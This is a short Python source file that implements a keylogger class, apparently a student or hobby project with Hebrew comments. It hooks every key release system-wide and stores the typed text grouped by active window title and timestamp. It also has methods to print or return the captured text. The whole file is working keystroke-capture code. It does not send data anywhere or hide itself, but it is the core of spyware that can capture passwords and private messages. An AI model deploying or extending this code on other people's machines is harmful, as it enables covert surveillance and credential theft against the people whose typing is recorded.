import keyboard
from datetime import datetime
import pygetwindow as pw
import time

class KeyloggerService:

    def __init__(self):
        self.data = {}
        self.getKeyWord()
        #self.getData()

    def getKeyWord(self):
        def callback(event):
            event_name = event.name.replace("space", " ").replace("enter", "\n")

            current_time = self.getTime(event)
            activeWindow = self.getWindowName()

            if activeWindow not in self.data:
                self.data[activeWindow] = {}
            if current_time not in self.data[activeWindow]:
                self.data[activeWindow][current_time] = ""

            self.data[activeWindow][current_time] += event_name

        keyboard.on_release(callback)


    def getData(self):
        print("\nData collected:")
        time.sleep(5)
        for window, timestamps in self.data.items():
            print(f"\n window: {window}")

            # מחברים את כל התווים למחרוזת אחת
            all_keys = "".join("".join(keys).replace("space"," ").replace("enter", "\n") for keys in timestamps.values())

            # מחלקים למילים לפי רווחים
            words = all_keys.split()

            # מחברים מחדש עם רווח אחד בין המילים
            formatted_text = " ".join(words)

            print(formatted_text)


    def getWindowName(self):
        return pw.getActiveWindowTitle() or "Unknown Window"

    def getTime(self, event):
        return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d %H:%M")


    def get_collected_data(self):
        return self.data

